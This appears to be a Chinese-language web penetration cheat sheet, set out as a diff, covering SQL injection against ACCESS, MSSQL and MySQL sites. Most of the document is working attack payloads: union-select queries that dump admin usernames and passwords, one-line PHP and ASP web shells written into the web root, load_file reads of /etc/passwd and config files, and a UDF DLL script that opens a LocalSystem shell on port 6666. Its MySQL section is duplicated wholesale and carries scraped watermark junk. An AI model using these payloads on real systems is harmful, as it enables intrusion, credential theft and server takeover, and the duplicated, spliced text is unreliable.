@@ -1,0 +1,336 @@
+渗透之脚本入侵（ASP，PHP）
+
+1. 数字型：view sourceprint?1 and 1=1 and 1=2 
+2.字符型：view sourceprint?1 ' and '1'='1 ' and '1'='2 
+3.搜索型：view sourceprint?1 %' and 1=1 and '%'='% 或者 %' and 1=2 and '%'='% 
+（PS：第三个大家可能不常用，他一般在ASP脚本中一般写成：keyword=request（”keyword”），赋值“KYO”到SQL语句中的时候即变为Select * from 表名 where keyword like ‘%KYO%’）
+
+语句型（IIS报不报错，语句自己区分）：
+          and user>0  
+          and  (select count(*) from msysobjects)>0 ……（页面错误为access数据库）
+          and  (select count(*) from sysobjects)>0 ……（页面正常为MSSQL数据库）
+          and  db_name（）>0 ……(爆数据库名)
+         and 0<>(select @@version)--  (爆SQLServer版本信息以及服务器操作系统的类型和版本信息) 
+     粗略型：加 ’（根据服务器报错的信息来判断）
+        加 ;--（；和--MSSQL数据库里面一般都有， ； 表示分离，-- 则是注释符ACCESS数据库里没有）
+   判断MYSQL权限：                     and 0<>（Select ISSRVROLEMEMBER（’sysadmin’））--（页面正常则为SA）
+          and 0<>（Select IS_MEMBER（’db_owner’））--（页面正常则为db_owner）
+                  and 0<>（Select IS_MEMBER（’public’））--（页面正常则是public）
+     PS：以上方法适用于参数是int的时候，若为字符型，需在参数后添加’和查询语句后添加；
+
+开始进行SQL注入(ACCESS)：       
+
+  猜解表名：
+          and 0<>(select count(*) from 表名) 或and exists（Select * from 表名）
+                        and 1<(select count(*) from 表名) （页面错误说明帐号数目就是1个）
+         猜解字段:
+    and exists（Select 字段名 from 表名）（页面正常存在，不正常不存在）
+         猜解用户名和密码长度：
+                  and（Select top 1 len（列名） from 表名）>N （TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N）                   
+                   如：and 1=(select count(*) from user where len(name)>6) 错误 
+                   and 1=(select count(*) from user where len(name)>5) 正确 
+                    
+             猜解用户名和密码：and (select top 1 asc(mid(列名,1,1)) from 表名)>0 
+                                如：and (select top 1 asc(mid(user,1,1)) from name)>96页面正常
+                         and (select top 1 asc(mid(user,1,1)) from name)>97页面错误
+                         则ASCLL码为97
+               PS：因为MD5的密文只有16,18,32,40这几个，所以猜解密码的时候只要试一试15,16,17,18,31,32,39,40等就简单些。
+开始进行SQL注入(MYSQL)：     
+             爆出表名和字段： having 1=1-- - 
+                                 插入新记录： group by users.ID having 1=1--
+
+                                  猜解表名：and (select top 1 name from sysobjects where xtype='u')>0 （获得第一个表名）
+                                 and (select top 1 name from sysobjects where xtype='u' and name not in ('user'))>0（获得第二个表名）
+                    猜解列名：and (select top 1 col_name(object_id('字段'),1) from sysobjects)>0（得到字段的第一个列名）  
+                      猜解字段内容：and (select top 1 列名 from [表名])>0
+                                                        如：and (select top 1 username from [admin])>0 （获取用户名）
+                                    and (select top 1 password from [admin])>0 （获取密码）
+                                 
+        1.利用SQL执行命令功能导出WebShell:
+                                                    SELECT '<%execute request("a")%>' into [vote] in 'd:\web\x.asp;.xls' 'excel 8.0;' from vote
+PS：需提供SQL执行功能且知道绝对路径方可使用(vote为已知表段)
+                            2.建立一个有一个A字段的表 表名为a 字段类型为字符 长度为50，在表A的a字段插入密码为laohu的一句话木马，把表a的内容导出为物理路径的一个EXCEL文件，导出为EXCEL后在利用IIS解析漏洞就可以变成小马了。
+语句：view sourceprint?1 create table cmd (a varchar(50))  
+
+2 insert into cmd (a) values ('<%execute request("laohu")%>')  
+
+3 select * into [a] in 'f:\host\qhdyxt\web\a.asp;.xls' 'excel 4.0;' from cmd  
+
+4 drop table cmd 
+提权：  
+1.system权限下直接添加账号（可能的话）：直接CMD命令添加
+  2.使用shell自带的提权功能：Serv_U，pcAnywhere，Radmin密码读取等，全部试一试
+  3.利用系统的漏洞进行溢出提权：利用巴西烤肉提权，在CMD命令一行里输入C:\recycler\1.exe空格“CMD命令”，1.exe就是巴西烤肉咯
+  4.用软件的漏洞来提权（这个机会比较渺茫，个人没有成功过）
+ 5.在conn.asp webconfig.asp等文件查找SA密码或者查找inc.php 等文件里面的ROOT密码（可以用CMD语句查找，如：利用CMD命令 dir /s d:\conn.asp 或者 dir /s d:\*inc*.php 来查找配置文件）
+                                                       PHP+MYSQL
+1.漏洞判断同上。 
+2.数据库信息判断：
+              1.数据库类型，简单的直接利用上面的相关语句就可以
+  Y; J/ t+ `' U90 Security Team              2.爆数据库的版本信息，库名以及用户名（前提得到字段数及可利用字段）：and 1=2 union select 1,2,3,4,version(),database(),user(),8--
+                                                                                                或者：+union+select+1,2,,3,4,database(),version(),user(),8 （要在参数前加-）
+           3.数据库权限：and ord(mid(user(),1,1))=114 /* （页面正常说明为root）
+                4.爆操作系统相关信息：and 1=2 union all select @@global.version_compile_os from mysql.user /*
+3.开始注入：
+       1.查询字段： （1）用union联合查询：and 1=1 union select 1,2,3,4,5……
+                        （2）用order by 查询“order by *--
+             2.爆可利用字段：and 1=2 union select 1,2,3,4,5,6,7……
+                                            或者+union+select+1,2,3,4,5,6,7…… （要在参数前加-）
+         PS:不用猜解可用字段暴数据库信息(部分网站适用)
+                                                                                  and 1=2 union all select version() /*
+
+                                                                      and 1=2 union all select database() /*
+
+                                                                             and 1=2 union all select user() /*
+      第一种方法：  暴库            
+                        3.暴库 (前提是mysql>5.0，因为Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息)：
+                      and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
+
+                4.猜解表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）-- 
+                    5.猜解字段：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
+                   6.爆密码：and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
+                            PS：高级用法：Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
+      第二种方法：利用虚拟库information_schema 爆表
+                      3.+union+select+1,2,3,4,table_name,5+from+information_schema.tables+where+table_schema=数据库名的16进制+limit+1,1
+                          或者and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名的16进制 limit 1,1--
+                      PS: limit 1,1可以变化，查询下一个 - 专注Web信息安全5 Q. e) ]. Y* g3 z0 j. q  h/ A4 _
+               4.利用表爆字段：+union+select+1,2,3,4,column_name,5+from+information_schema.columns+where+table_name=爆出来的字段的16进制                                           或者：and 1=2 union select 1,2,3,4,column_name,5 from information_schema.columns where table_name=爆出来的字段的16进制--
+                      5.爆用户名和密码：+union+select+1,2,3,用户名字段,密码字段,6+from+管理表
+                      或者：and 1=2 union select 1,2,3,用户名字段,密码字段,6 from 管理表--
+                       （PS：一次性爆表：.+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+table_name),6+from+information_schema.columns+where+table_schema=数据库名的16进制
+                  一次性爆出所有字段：+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+column_name),6+from+information_schema.columns+where+table_schema=数据库名的16进制
+                  一次性爆密码和用户名：+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+用户名,0x5f,密码)，6+from+管理表）
+
+                              PS：这里面所有的+号是代替空格的，还可以用/**/来代替,不同情况，不同分析!但是参数前必须加-4.拿webshell        
+    1.导出一句话拿WebShell  
+1.   Drop TABLE IF EXISTS temp;Create TABLE temp(cmd text NOT NULL); Insert INTO temp (cmd) VALUES('<? php eval($_POST[cmd]);?>'); Select cmd from temp into out file 'F:/wwwroot/eval.php'; Drop TABLE IF EXISTS temp; 
+或者：1. Select '<? php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php'; 
+PS：eval.php是导入对象
+5.提权：
+第一种方法：直接写马(Root权限)
+条件：1、知道站点物理路径
+
+       2、有足够大的权限（可以用select …. from mysql.user测试）
+
+       3、magic_quotes_gpc()=OFF
+select   ‘<?php eval($_POST[cmd])?>’   into outfile ‘物理路径’
+
+and 1=2 union all select 一句话HEX值 into outfile '路径'
+
+load_file() 常用路径：
+
+　　1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
+　　2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+　　上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.
+　　3、 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 
+　　4、/etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件
+　　5、c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf 查看WINDOWS系统apache文件
+　　6、c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.
+　7、c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+　　8、d:\APACHE\Apache2\conf\httpd.conf
+        9、C:\Program Files\mysql\my.ini
+
+　　10、../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径
+　　11、 c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件
+         12、 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看90s
+　　13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+　　14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看
+　　15、 /etc/sysconfig/iptables 本看防火墙策略
+　   16 、 usr/local/app/php5 b/php.ini PHP 的相当设置
+　　17 、/etc/my.cnf MYSQL的配置文件
+　　18、 /etc/redhat-release   红帽子的系统版本
+　　19 、C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+　　20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP
+　　21、/usr/local/app/php5 b/php.ini //PHP相关设置
+　     22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置
+　　23、C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+　　24、c:\windows\my.ini
+        25、c:\boot.ini
+
+网站常用配置文件 config.inc.php、config.php。load_file（）时要用replace（load_file(HEX)，char(60),char(32)）
+注：
+Char(60)表示 <
+cher（32）表示 空格
+
+第二种方法：直接在PHPSPY新建一个PHP文件
+
+01 $link=mysql_connect('127.0.0.1','root','root');  
+
+02    
+
+03 　　if (!$link) {  
+
+04    
+
+05 　　die('Could NOt Connect The Database!: ' . mysql_error());  
+
+06    
+
+07 　　};  
+
+08    
+
+09 　　echo "Good Boy.Connected!  
+
+10 ";  
+
+11    
+
+12 　　//这里的root\root就是从my.ini中读取的用户和密码.  
+
+13    
+
+14 　　@mysql_select_db('mysql') or die ('use database mysql failed!');  
+
+15    
+
+16 　　echo "Yes You Did!  
+
+17 ";  
+
+18    
+
+19 　　//这里选择使用MySQL数据库表.当然你也可以选择别的,如test.  
+
+20    
+
+21 　　$query="Create Function Shell RETURNS INTEGER SONAME 'd:\\wwwroot\\FurQ.dll';";  
+
+22    
+
+23 　　@$result = mysql_query($query, $link) or die ("Create Function Failed!");  
+
+24    
+
+25 　　echo "Goddess...Successed!  
+
+26 ";  
+
+27    
+
+28 　　//这两句话是关键,执行MySQL的创建函数语句.将d:\wwwroot\furq.dll中的Shell函数创建进MySQL中.使得MySQL可以执行这个Shell函数.  
+
+29    
+
+30 　　$query="Select Shell();";  
+
+31    
+
+32 　　@$result = mysql_query($query, $link) or die ("Execute failed");  
+
+33    
+
+34 　　echo "Congratulations! Connect The Port 6666 Of This Server VS password:FurQ  
+
+35 ";  
+
+36    
+
+37 　　//这一步是执行这个Shell函数,打开服务器的6666端口.  
+
+38    
+
+39 　　?> 
+然后再执行，由于继承的是MySQL的权限,而Win系统下MySQL默认以服务安装,所以得到的Shell为LocalSystem权限
+      第一种方法：  暴库            
+                        3.暴库 (前提是mysql>5.0，因为Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息)：
+                      and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
+
+                4.猜解表名：and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）-- 
+                    5.猜解字段：and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
+                   6.爆密码：and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
+                            PS：高级用法：Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1
+      第二种方法：利用虚拟库information_schema 爆表
+                      3.+union+select+1,2,3,4,table_name,5+from+information_schema.tables+where+table_schema=数据库名的16进制+limit+1,1
+                          或者and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名的16进制 limit 1,1--
+                      PS: limit 1,1可以变化，查询下一个 - 专注Web信息安全5 Q. e) ]. Y* g3 z0 j. q  h/ A4 _
+               4.利用表爆字段：+union+select+1,2,3,4,column_name,5+from+information_schema.columns+where+table_name=爆出来的字段的16进制                                           或者：and 1=2 union select 1,2,3,4,column_name,5 from information_schema.columns where table_name=爆出来的字段的16进制--
+                      5.爆用户名和密码：+union+select+1,2,3,用户名字段,密码字段,6+from+管理表
+                      或者：and 1=2 union select 1,2,3,用户名字段,密码字段,6 from 管理表--
+                       （PS：一次性爆表：.+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+table_name),6+from+information_schema.columns+where+table_schema=数据库名的16进制
+                  一次性爆出所有字段：+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+column_name),6+from+information_schema.columns+where+table_schema=数据库名的16进制
+                  一次性爆密码和用户名：+union+select+1,2,3,4,GROUP_CONCAT(DISTINCT+用户名,0x5f,密码)，6+from+管理表）
+
+                              PS：这里面所有的+号是代替空格的，还可以用/**/来代替,不同情况，不同分析!但是参数前必须加-4.拿webshell        
+    1.导出一句话拿WebShell  
+1.   Drop TABLE IF EXISTS temp;Create TABLE temp(cmd text NOT NULL); Insert INTO temp (cmd) VALUES('<? php eval($_POST[cmd]);?>'); Select cmd from temp into out file 'F:/wwwroot/eval.php'; Drop TABLE IF EXISTS temp; 
+或者：1. Select '<? php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php'; 
+PS：eval.php是导入对象
+5.提权：
+第一种方法：直接写马(Root权限)
+条件：1、知道站点物理路径
+2、有足够大的权限（可以用select …. from mysql.user测试）
+3、magic_quotes_gpc()=OFF
+select   ‘<?php eval($_POST[cmd])?>’   into outfile ‘物理路径’
+and 1=2 union all select 一句话HEX值 into outfile '路径'
+load_file() 常用路径：1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
+　　2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+　　上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “<” 替换成”空格” 返回的是网页.而无法查看到代码.
+　　3、 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 
+　　4、/etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件
+　　5、c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf 查看WINDOWS系统apache文件
+　　6、c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.
+　7、c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+　　8、d:\APACHE\Apache2\conf\httpd.conf
+        9、C:\Program Files\mysql\my.ini
+    10、../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径
+　　11、 c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件
+         12、 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看90s
+　　13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+　　14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看
+　　15、 /etc/sysconfig/iptables 本看防火墙策略
+　   16 、 usr/local/app/php5 b/php.ini PHP 的相当设置
+　　17 、/etc/my.cnf MYSQL的配置文件
+　　18、 /etc/redhat-release   红帽子的系统版本
+　　19 、C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+　　20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP
+　　21、/usr/local/app/php5 b/php.ini //PHP相关设置
+　     22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置
+　　23、C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+　　24、c:\windows\my.ini
+        25、c:\boot.ini
+网站常用配置文件 config.inc.php、config.php。load_file（）时要用replace（load_file(HEX)，char(60),char(32)）
+注：
+Char(60)表示 <
+cher（32）表示 空格
+第二种方法：直接在PHPSPY新建一个PHP文件
+01 $link=mysql_connect('127.0.0.1','root','root');  
+02    
+03 　　if (!$link) {  
+04    
+05 　　die('Could NOt Connect The Database!: ' . mysql_error());  
+06    
+07 　　};  
+08    
+09 　　echo "Good Boy.Connected!  
+10 ";  
+11    
+12 　　//这里的root\root就是从my.ini中读取的用户和密码.  
+13    
+14 　　@mysql_select_db('mysql') or die ('use database mysql failed!');  
+15    
+16 　　echo "Yes You Did!  
+17 ";  
+18    
+19 　　//这里选择使用MySQL数据库表.当然你也可以选择别的,如test.  
+20    
+21 　　$query="Create Function Shell RETURNS INTEGER SONAME 'd:\\wwwroot\\FurQ.dll';";  
+22    
+23 　　@$result = mysql_query($query, $link) or die ("Create Function Failed!");  
+24    
+25 　　echo "Goddess...Successed!  
+26 ";  
+27    
+28 　　//这两句话是关键,执行MySQL的创建函数语句.将d:\wwwroot\furq.dll中的Shell函数创建进MySQL中.使得MySQL可以执行这个Shell函数.  
+29    
+30 　　$query="Select Shell();";  
+31    
+32 　　@$result = mysql_query($query, $link) or die ("Execute failed");  
+33    
+34 　　echo "Congratulations! Connect The Port 6666 Of This Server VS password:FurQ  
+35 ";  
+36    
+37 　　//这一步是执行这个Shell函数,打开服务器的6666端口.  
+38    
+39 　　?> 
+然后再执行，由于继承的是MySQL的权限,而Win系统下MySQL默认以服务安装,所以得到的Shell为LocalSystem权限
